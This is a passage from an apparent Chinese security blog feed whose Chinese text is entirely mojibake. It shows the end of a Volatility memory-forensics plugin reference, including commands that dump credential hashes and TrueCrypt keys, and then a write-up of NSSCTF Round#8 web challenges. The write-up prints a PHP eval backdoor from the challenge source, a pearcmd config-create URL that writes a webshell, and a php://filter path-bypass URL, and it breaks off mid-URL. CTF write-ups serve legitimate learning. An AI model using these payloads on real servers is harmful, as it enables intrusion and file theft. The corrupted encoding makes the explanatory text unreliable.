Table)</td></tr><tr><td>getservicesids</td><td>è·å–æ³¨å†Œè¡¨ä¸­çš„æœåŠ¡åç§°å¹¶è¿”å›SIDä¿¡æ¯</td></tr><tr><td>getsids</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹çš„SIDä¿¡æ¯</td></tr><tr><td>handles</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„çš„åˆ—è¡¨</td></tr><tr><td>hashdump</td><td>è½¬å‚¨å†…å­˜ä¸­çš„Windowså¸æˆ·å¯†ç å“ˆå¸Œ(LM/NTLM)</td></tr><tr><td>hibinfo</td><td>è½¬å‚¨ä¼‘çœ æ–‡ä»¶ä¿¡æ¯</td></tr><tr><td>hivedump</td><td>æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒä¿¡æ¯</td></tr><tr><td>hivelist</td><td>æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒåˆ—è¡¨</td></tr><tr><td>hivescan</td><td>æ³¨å†Œè¡¨é…ç½®å•å…ƒæ± æ‰«æ</td></tr><tr><td>hpakextract</td><td>ä»HPAKæ–‡ä»¶ï¼ˆFast Dumpæ ¼å¼ï¼‰æå–ç‰©ç†å†…å­˜æ•°æ®</td></tr><tr><td>hpakinfo</td><td>æŸ¥çœ‹HPAKæ–‡ä»¶å±æ€§åŠç›¸å…³ä¿¡æ¯</td></tr><tr><td>idt</td><td>æ˜¾ç¤ºä¸­æ–­æè¿°ç¬¦è¡¨(Interrupt Deor Table)</td></tr><tr><td>iehistory</td><td>é‡å»ºIEç¼“å­˜åŠè®¿é—®å†å²è®°å½•</td></tr><tr><td>imagecopy</td><td>å°†ç‰©ç†åœ°å€ç©ºé—´å¯¼å‡ºåŸç”ŸDDé•œåƒæ–‡ä»¶</td></tr><tr><td>imageinfo</td><td>æŸ¥çœ‹/è¯†åˆ«é•œåƒä¿¡æ¯</td></tr><tr><td>impscan</td><td>æ‰«æå¯¹å¯¼å…¥å‡½æ•°çš„è°ƒç”¨</td></tr><tr><td>joblinks</td><td>æ‰“å°è¿›ç¨‹ä»»åŠ¡é“¾æ¥ä¿¡æ¯</td></tr><tr><td>kdbgscan</td><td>æœç´¢å’Œè½¬å‚¨æ½œåœ¨KDBGå€¼</td></tr><tr><td>kpcrscan</td><td>æœç´¢å’Œè½¬å‚¨æ½œåœ¨KPCRå€¼</td></tr><tr><td>ldrmodules</td><td>æ£€æµ‹æœªé“¾æ¥çš„åŠ¨æ€é“¾æ¥DLL</td></tr><tr><td>lsadump</td><td>ä»æ³¨å†Œè¡¨ä¸­æå–LSAå¯†é’¥ä¿¡æ¯ï¼ˆå·²è§£å¯†ï¼‰</td></tr><tr><td>machoinfo</td><td>è½¬å‚¨Mach-O æ–‡ä»¶æ ¼å¼ä¿¡æ¯</td></tr><tr><td>malfind</td><td>æŸ¥æ‰¾éšè—çš„å’Œæ’å…¥çš„ä»£ç </td></tr><tr><td>mbrparser</td><td>æ‰«æå¹¶è§£ææ½œåœ¨çš„ä¸»å¼•å¯¼è®°å½•(MBR)</td></tr><tr><td>memdump</td><td>è½¬å‚¨è¿›ç¨‹çš„å¯å¯»å€å†…å­˜</td></tr><tr><td>memmap</td><td>æ‰“å°å†…å­˜æ˜ å°„</td></tr><tr><td>messagehooks</td><td>æ¡Œé¢å’Œçª—å£æ¶ˆæ¯é’©å­çš„çº¿ç¨‹åˆ—è¡¨</td></tr><tr><td>mftparser</td><td>æ‰«æå¹¶è§£ææ½œåœ¨çš„MFTæ¡ç›®</td></tr><tr><td>moddump</td><td>è½¬å‚¨å†…æ ¸é©±åŠ¨ç¨‹åºåˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ç¤ºä¾‹</td></tr><tr><td>modscan</td><td>å†…æ ¸æ¨¡å—æ± æ‰«æ</td></tr><tr><td>modules</td><td>æ‰“å°åŠ è½½æ¨¡å—çš„åˆ—è¡¨</td></tr><tr><td>multiscan</td><td>æ‰¹é‡æ‰«æå„ç§å¯¹è±¡</td></tr><tr><td>mutantscan</td><td>å¯¹äº’æ–¥å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>notepad</td><td>æŸ¥çœ‹è®°äº‹æœ¬å½“å‰æ˜¾ç¤ºçš„æ–‡æœ¬</td></tr><tr><td>objtypescan</td><td>æ‰«æçª—å£å¯¹è±¡ç±»å‹å¯¹è±¡</td></tr><tr><td>patcher</td><td>åŸºäºé¡µé¢æ‰«æçš„è¡¥ä¸ç¨‹åºå†…å­˜</td></tr><tr><td>poolpeek</td><td>å¯é…ç½®çš„æ± æ‰«æå™¨æ’ä»¶</td></tr><tr><td>printkey</td><td>æ‰“å°æ³¨å†Œè¡¨é¡¹åŠå…¶å­é¡¹å’Œå€¼</td></tr><tr><td>privs</td><td>æ˜¾ç¤ºè¿›ç¨‹æƒé™</td></tr><tr><td>procdump</td><td>è¿›ç¨‹è½¬å‚¨åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç¤ºä¾‹</td></tr><tr><td>pslist</td><td>æŒ‰ç…§EPROCESSåˆ—è¡¨æ‰“å°æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</td></tr><tr><td>psscan</td><td>è¿›ç¨‹å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>pstree</td><td>ä»¥æ ‘å‹æ–¹å¼æ‰“å°è¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>psxview</td><td>æŸ¥æ‰¾å¸¦æœ‰éšè—è¿›ç¨‹çš„æ‰€æœ‰è¿›ç¨‹åˆ—è¡¨</td></tr><tr><td>qemuinfo</td><td>è½¬å‚¨Qemu ä¿¡æ¯</td></tr><tr><td>raw2dmp</td><td>å°†ç‰©ç†å†…å­˜åŸç”Ÿæ•°æ®è½¬æ¢ä¸ºwindbgå´©æºƒè½¬å‚¨æ ¼å¼</td></tr><tr><td>screenshot</td><td>åŸºäºGDI Windowsçš„è™šæ‹Ÿå±å¹•æˆªå›¾ä¿å­˜</td></tr><tr><td>servicediff</td><td>WindowsæœåŠ¡åˆ—è¡¨(ala Plugx)</td></tr><tr><td>sessions</td><td>_MM_SESSION_SPACEçš„è¯¦ç»†ä¿¡æ¯åˆ—è¡¨(ç”¨æˆ·ç™»å½•ä¼šè¯)</td></tr><tr><td>shellbags</td><td>æ‰“å°Shellbagsä¿¡æ¯</td></tr><tr><td>shimcache</td><td>è§£æåº”ç”¨ç¨‹åºå…¼å®¹æ€§Shimç¼“å­˜æ³¨å†Œè¡¨é¡¹</td></tr><tr><td>shutdowntime</td><td>ä»å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ä¿¡æ¯è·å–æœºå™¨å…³æœºæ—¶é—´</td></tr><tr><td>sockets</td><td>æ‰“å°å·²æ‰“å¼€å¥—æ¥å­—åˆ—è¡¨</td></tr><tr><td>sockscan</td><td>TCPå¥—æ¥å­—å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>ssdt</td><td>æ˜¾ç¤ºSSDTæ¡ç›®</td></tr><tr><td>strings</td><td>ç‰©ç†åˆ°è™šæ‹Ÿåœ°å€çš„åç§»åŒ¹é…(éœ€è¦ä¸€äº›æ—¶é—´ï¼Œå¸¦è¯¦ç»†ä¿¡æ¯)</td></tr><tr><td>svcscan</td><td>WindowsæœåŠ¡åˆ—è¡¨æ‰«æ</td></tr><tr><td>symlinkscan</td><td>ç¬¦å·é“¾æ¥å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>thrdscan</td><td>çº¿ç¨‹å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>threads</td><td>è°ƒæŸ¥_ETHREAD å’Œ_KTHREADs</td></tr><tr><td>timeliner</td><td>åˆ›å»ºå†…å­˜ä¸­çš„å„ç§ç—•è¿¹ä¿¡æ¯çš„æ—¶é—´çº¿</td></tr><tr><td>timers</td><td>æ‰“å°å†…æ ¸è®¡æ—¶å™¨åŠå…³è”æ¨¡å—çš„DPC</td></tr><tr><td>truecryptmaster</td><td>æ¢å¤TrueCrypt 7.1aä¸»å¯†é’¥</td></tr><tr><td>truecryptpassphrase</td><td>æŸ¥æ‰¾å¹¶æå–TrueCryptå¯†ç </td></tr><tr><td>truecryptsummary</td><td>TrueCryptæ‘˜è¦ä¿¡æ¯</td></tr><tr><td>unloadedmodules</td><td>æ‰“å°å¸è½½çš„æ¨¡å—ä¿¡æ¯åˆ—è¡¨</td></tr><tr><td>userassist</td><td>æ‰“å°æ³¨å†Œè¡¨ä¸­UserAssistç›¸å…³ä¿¡æ¯</td></tr><tr><td>userhandles</td><td>è½¬å‚¨ç”¨æˆ·å¥æŸ„è¡¨</td></tr><tr><td>vaddump</td><td>è½¬å‚¨VADæ•°æ®ä¸ºæ–‡ä»¶</td></tr><tr><td>vadinfo</td><td>è½¬å‚¨VADä¿¡æ¯</td></tr><tr><td>vadtree</td><td>ä»¥æ ‘å½¢æ–¹å¼æ˜¾ç¤ºVADæ ‘ä¿¡æ¯</td></tr><tr><td>vadwalk</td><td>æ˜¾ç¤ºéå†VADæ ‘</td></tr><tr><td>vboxinfo</td><td>è½¬å‚¨Virtualboxä¿¡æ¯ï¼ˆè™šæ‹Ÿæœºï¼‰</td></tr><tr><td>verinfo</td><td>æ‰“å°PEé•œåƒä¸­çš„ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>vmwareinfo</td><td>è½¬å‚¨VMware VMSS/VMSN ä¿¡æ¯</td></tr><tr><td>volshell</td><td>å†…å­˜é•œåƒä¸­çš„shell</td></tr><tr><td>windows</td><td>æ‰“å°æ¡Œé¢çª—å£(è¯¦ç»†ä¿¡æ¯)</td></tr><tr><td>wintree</td><td>Zé¡ºåºæ‰“å°æ¡Œé¢çª—å£æ ‘</td></tr><tr><td>wndscan</td><td>æ± æ‰«æçª—å£ç«™</td></tr><tr><td>yarascan</td><td>ä»¥Yaraç­¾åæ‰«æè¿›ç¨‹æˆ–å†…æ ¸å†…å­˜</td></tr></tbody></table><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤ #"></a>å¸¸ç”¨å‘½ä»¤ <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">#</a></h3><table><thead><tr><th><strong>åŠŸèƒ½</strong></th><th><strong>å‘½ä»¤è¡ŒåŠå‚æ•°</strong></th></tr></thead><tbody><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 pslist</td></tr><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼ˆæ ‘å½¢ï¼‰</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 pstree</td></tr><tr><td>æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨(psxè§†å›¾)</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 psxview</td></tr><tr><td>æŸ¥çœ‹ç½‘ç»œé€šè®¯è¿æ¥</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 netscan</td></tr><tr><td>æŸ¥çœ‹åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 dlllist</td></tr><tr><td>æŸ¥çœ‹SSDTè¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 ssdt</td></tr><tr><td>æŸ¥çœ‹UserAssistç—•è¿¹</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 userassist</td></tr><tr><td>æŸ¥çœ‹ShimCacheç—•è¿¹</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shimcache</td></tr><tr><td>æŸ¥çœ‹ShellBags</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shellbags</td></tr><tr><td>æŸ¥çœ‹æœåŠ¡åˆ—è¡¨</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 svcscan</td></tr><tr><td>æŸ¥çœ‹Windowså¸æˆ·hash</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 hashdump</td></tr><tr><td>æŸ¥çœ‹æœ€åå…³æœºæ—¶é—´</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 shutdowntime</td></tr><tr><td>æŸ¥çœ‹IEå†å²è®°å½•</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 iehistory</td></tr><tr><td>æå–æ³¨å†Œè¡¨æ•°æ®</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 dumpregistry</td></tr><tr><td>è§£æMFTè®°å½•</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 mftparser</td></tr><tr><td>å¯¼å‡ºMFTè®°å½•,æ¢å¤æ–‡ä»¶</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 mftparser â€“output-file=mftverbose.txt -D mftoutput</td></tr><tr><td>è·å–TrueCryptå¯†é’¥ä¿¡æ¯</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 truecryptmaster</td></tr><tr><td>è·å–TrueCryptå¯†ç ä¿¡æ¯</td><td>python2 vol.py -f Win7_SP1_x86.vmem â€“profile=Win7SP1x86 truecryptpassphras</td></tr></tbody></table><h4 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h4><p>banners.Banners<br>è¯†åˆ«linuxé•œåƒçš„bannerä¿¡æ¯<br>ä¸è¯†åˆ«windowsçš„é•œåƒ</p><p>isfinfo.IsfInfo<br>ç¡®å®šå½“å‰å¯ç”¨çš„ISFæ–‡ä»¶<br>å…·ä½“ä»€ä¹ˆæ˜¯ISFæ–‡ä»¶ï¼Œæˆ‘ä¹Ÿæ²¡æŸ¥åˆ°<br>å¦‚ä¸‹</p><p>layerwriter.LayerWriter<br>Runs the automagics and writes out the primary layer produced by the stacker.<br>è¿è¡Œ automagics å¹¶å†™å‡ºå †æ ˆå™¨äº§ç”Ÿçš„ä¸»å±‚</p><p>timeliner.Timeliner<br>Runs all relevant plugins that provide time related information and orders the results by time.<br>è¿è¡Œæ‰€æœ‰æä¾›æ—¶é—´ç›¸å…³ä¿¡æ¯å¹¶æŒ‰æ—¶é—´æ’åºç»“æœçš„ç›¸å…³æ’ä»¶ï¼Œç®€ç§°ï¼Œå…¨è‡ªåŠ¨æ´—è¡£æœº</p><p>windows.cachedump.Cachedump<br>Dumps lsa secrets from memory<br>ä»å†…å­˜ä¸­è½¬å‚¨ lsa å¯†ç <br>æˆ‘è¿™æ˜¯è½¬å‚¨å¤±è´¥äº†</p><p>windows.callbacks.Callbacks<br>Lists kernel callbacks and notification routines.<br>åˆ—å‡ºå†…æ ¸å›è°ƒå’Œé€šçŸ¥ä¾‹ç¨‹</p><p>windows.cmdline.CmdLine<br>Lists process command line arguments.<br>åˆ—å‡ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°</p><p>windows.crashinfo.Crashinfo<br>windows.dlllist.DllList<br>Lists the loaded modules in a particular windows memory image.<br>åˆ—å‡ºåŠ è½½çš„dll</p><p>windows.driverirp.DriverIrp<br>List IRPs for drivers in a particular windows memory image.<br>åˆ—å‡ºWindows é•œåƒä¸­é©±åŠ¨ç¨‹åºçš„ IRP</p><p>windows.driverscan.DriverScan<br>Scans for drivers present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows é•œåƒä¸­çš„é©±åŠ¨ç¨‹åº</p><p>windows.dumpfiles.DumpFiles<br>Dumps cached file contents from Windows memory samples.<br>ä» Windows å†…å­˜ä¸­è½¬å‚¨ç¼“å­˜çš„æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶å¤¹è¦çˆ†äº†</p><p>windows.envars.Envars<br>Display process environment variables<br>æ˜¾ç¤ºè¿›ç¨‹ç¯å¢ƒå˜é‡</p><p>windows.filescan.FileScan<br>Scans for file objects present in a particular windows memory image.<br>æ‰«ææ–‡ä»¶</p><p>windows.getservicesids.GetServiceSIDs<br>Lists process token sids.</p><p>windows.getsids.GetSIDs<br>Print the SIDs owning each process<br>åˆ—å‡ºæ¯ä¸ªè¿›ç¨‹çš„sid</p><p>windows.handles.Handles<br>Lists process open handles.<br>åˆ—å‡ºè¿›ç¨‹æ‰“å¼€çš„å¥æŸ„</p><p>windows.hashdump.Hashdump<br>Dumps user hashes from memory<br>è·å–å“ˆå¸Œ</p><p>windows.info.Info<br>Show OS &amp; kernel details of the memory sample being analyzed.<br>è·å–ç³»ç»Ÿå†…æ ¸ä¿¡æ¯</p><p>windows.lsadump.Lsadump<br>Dumps lsa secrets from memory<br>ä»å†…å­˜ä¸­è½¬å‚¨ lsa å¯†ç <br>å’Œcachedumpä¸€æ ·çš„è§£é‡Šï¼Œä½†æ˜¯æ‰§è¡Œçš„ç»“æœå´ä¸ä¸€æ ·</p><p>windows.malfind.Malfind<br>Lists process memory ranges that potentially contain injected code.<br>åˆ—å‡ºå¯èƒ½åŒ…å«æ³¨å…¥ä»£ç çš„è¿›ç¨‹å†…å­˜èŒƒå›´</p><p>windows.memmap.Memmap<br>Prints the memory map<br>æ‰“å°å†…å­˜æ˜ å°„</p><p>windows.modscan.ModScan<br>Scans for modules present in a particular windows memory image.<br>æ‰«æ Windows å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ¨¡å—</p><p>windows.modules.Modules<br>Lists the loaded kernel modules.<br>åˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—</p><p>windows.mutantscan.MutantScan<br>Scans for mutexes present in a particular windows memory image.<br>æ‰«æç‰¹å®š Windows å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„äº’æ–¥é”ï¼Œæ¸¸æˆå¤šå¼€ç”¨çš„å°±æ˜¯mutex</p><p>windows.netscan.NetScan<br>Scans for network objects present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows å†…å­˜æ˜ åƒä¸­çš„ç½‘ç»œå¯¹è±¡</p><p>windows.netstat.NetStat<br>Traverses network tracking structures present in a particular windows memory image.<br>éå† Windows å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„ç½‘ç»œçŠ¶æ€<br>å°±åƒæ‰§è¡Œäº†netstat -ano ä¸€æ ·</p><p>windows.poolscanner.PoolScanner<br>A generic pool scanner plugin.</p><p>windows.privileges.Privs<br>Lists process token privileges</p><p>windows.pslist.PsList<br>Lists the processes present in a particular windows memory image.</p><p>windows.psscan.PsScan<br>Scans for processes present in a particular windows memory image.<br>å°±åƒåœ¨linuxä¸­æ‰§è¡Œäº†psä¸€æ ·</p><p>windows.pstree.PsTree<br>Plugin for listing processes in a tree based on their parent process ID.<br>æ ¹æ®çˆ¶è¿›ç¨‹ ID åœ¨æ ‘ä¸­åˆ—å‡ºè¿›ç¨‹çš„æ’ä»¶<br>åæ­£æˆ‘æ˜¯æ²¡æœ‰çœ‹å‡ºæ¥æ ‘å½¢ç»“æ„ä½“ç°åœ¨å“ª</p><p>windows.registry.certificates.Certificates<br>Lists the certificates in the registryâ€™s Certificate Store.<br>åˆ—å‡ºæ³¨å†Œè¡¨çš„è¯ä¹¦å­˜å‚¨ä¸­çš„è¯ä¹¦</p><p>windows.registry.hivelist.HiveList<br>Lists the registry hives present in a particular memory image.<br>åˆ—å‡ºå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®</p><p>windows.registry.hivescan.HiveScan<br>Scans for registry hives present in a particular windows memory image.<br>æ‰«æ windows ä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒ</p><p>windows.registry.printkey.PrintKey<br>Lists the registry keys under a hive or specific key value.<br>åˆ—å‡ºé…ç½®å•å…ƒæˆ–ç‰¹å®šé”®å€¼ä¸‹çš„æ³¨å†Œè¡¨é¡¹</p><p>windows.registry.userassist.UserAssist<br>Print userassist registry keys and information.<br>æ‰“å° userassist æ³¨å†Œè¡¨é¡¹å’Œä¿¡æ¯</p><p>windows.skeleton_key_check.Skeleton_Key_Check<br>Looks for signs of Skeleton Key malware<br>å¯»æ‰¾ Skeleton Key æ¶æ„è½¯ä»¶çš„è¿¹è±¡</p><p>windows.ssdt.SSDT<br>Lists the system call table.<br>åˆ—å‡ºç³»ç»Ÿè°ƒç”¨è¡¨</p><p>windows.statistics.Statistics<br>ç»Ÿè®¡æ•°æ®</p><p>windows.strings.Strings<br>Reads output from the strings command and indicates which process(es) each string belongs to.<br>è¯»å– strings å‘½ä»¤çš„è¾“å‡ºå¹¶æŒ‡ç¤ºæ¯ä¸ªå­—ç¬¦ä¸²å±äºå“ªä¸ªè¿›ç¨‹<br>å·²å°½åŠ›ï¼Œå’ã€‚</p><p>windows.svcscan.SvcScan<br>Scans for windows services.<br>æœåŠ¡æ‰«æ</p><p>windows.symlinkscan.SymlinkScan<br>Scans for links present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows å†…å­˜æ˜ åƒä¸­çš„é“¾æ¥</p><p>windows.vadinfo.VadInfo<br>Lists process memory ranges.<br>åˆ—å‡ºè¿›ç¨‹å†…å­˜èŒƒå›´</p><p>windows.verinfo.VerInfo<br>Lists version information from PE files.<br>åˆ—å‡º PE æ–‡ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯</p><p>windows.virtmap.VirtMap<br>Lists virtual mapped sections.<br>åˆ—å‡ºè™šæ‹Ÿæ˜ å°„section</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#8</title>
      <link href="/2023/02/11/CTFS/NSSCTF-Round-8/"/>
      <url>/2023/02/11/CTFS/NSSCTF-Round-8/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h4><p><a href="http://43.142.108.3:28348/index.php?file=">http://43.142.108.3:28348/index.php?file=</a><br>è¿™é‡Œåº”è¯¥æ˜¯æ–‡ä»¶è¯»å–ï¼Œç›´æ¥ã€etc/passwd æ­£å¸¸ï¼Œindex.phpæ²¡æœ‰è¯»å–åˆ°ï¼Œé‚£ä¼ªåè®®è·å–æºç <br>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydOX1MuUyddKSkgew0KICAgIGV2YWwoJF9HRVRbJ05fUy5TJ10pOw0KfQ0KDQppZighaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOi9pbmRleC5waHA/ZmlsZT0nKTsNCn0gZWxzZSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KDQogICAgaWYgKCFwcmVnX21hdGNoKCcvXC5cLnxsYXxkYXRhfGlucHV0fGdsb2J8Z2xvYmFsfHZhcnxkaWN0fGdvcGhlcnxmaWxlfGh0dHB8cGhhcnxsb2NhbGhvc3R8XD98XCp8XH58emlwfDd6fGNvbXByZXNzL2lzJywgJGZpbGUpKSB7DQogICAgICAgIGluY2x1ZGUgJGZpbGU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZGllKCdlcnJvci4nKTsNCiAgICB9DQp9</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†è®¸å¤šå‡½æ•°ï¼Œä¸Šé¢æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œ<br>è¿™é‡ŒN_S.S å½¢å¼ç¬¬ä¸€æ¬¡è§æ˜¯åœ¨ctfshow web123</p><p>PHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼+ . [è½¬æ¢ä¸º_<br>ä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹æ€§å¯ä»¥ç»•è¿‡,ä½¿å˜é‡åå‡ºç°.ä¹‹ç±»çš„<br>ç‰¹æ®Šå­—ç¬¦[, GETæˆ–POSTæ–¹å¼ä¼ å‚æ—¶,å˜é‡åä¸­çš„[ä¹Ÿä¼šè¢«æ›¿æ¢ä¸º_,ä½†å…¶åçš„å­—ç¬¦å°±ä¸ä¼šè¢«æ›¿æ¢äº†<br>å¦‚ CTF[SHOW.COM=&gt;CTF_SHOW.COM<br>ä¹Ÿå°±æ˜¯ä¼ å‚çš„æ—¶å€™<br>n_s.s &gt; n[s.s</p><p><img src="/images/Round-8/image-20230216161717020.png" alt="image-20230216161717020"></p><p>FLAG åœ¨ç¯å¢ƒå˜é‡é‡Œ</p><h4 id="MyPage-ä¸ä¼š"><a href="#MyPage-ä¸ä¼š" class="headerlink" title="MyPage ä¸ä¼š"></a>MyPage ä¸ä¼š</h4><p>å‚è€ƒ<br><code>https://blog.csdn.net/qq_61768489/article/details/129016075</code><br><code>http://v2ish1yan.top/2023/02/12/%E6%AF%94%E8%B5%9Bwp/NSSCTF%20Round8/</code><br><code>https://juejin.cn/post/7147638903191814180</code><br>é¦–å…ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«å¯ä»¥etcpasswdæ­£å¸¸ï¼Œindexã€‚phpä¸å¯ä»¥.ä¼ªåè®®phpä¹Ÿä¸å¯ä»¥</p><p>pearå·¥å…·é‡Œæœ‰ä¸€ä¸ªå‘½ä»¤å«:config-create,è¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚<br>æˆ‘ä»¬å¯ä»¥æ„é€ url:<br>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php<br>å¤åˆ¶ä»£ç <br>ç„¶ååŒ…å«æˆ‘ä»¬æ–°å»ºçš„è¿™ä¸ªæ–‡ä»¶å°±OKäº†ã€‚</p><p><img src="/images/Round-8/image-20230216165541573.png" alt="image-20230216165541573"></p><p>è¿™é‡Œè¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œè¦åœ¨bpé‡å‘åŒ…å°±å¯ä»¥äº†</p><p><a href="http://43.142.108.3:28851/index.php?file=/tmp/shell.php">http://43.142.108.3:28851/index.php?file=/tmp/shell.php</a></p><p>äºŒ è¯»å–æºç  flag</p><p><a href="http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php">http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/s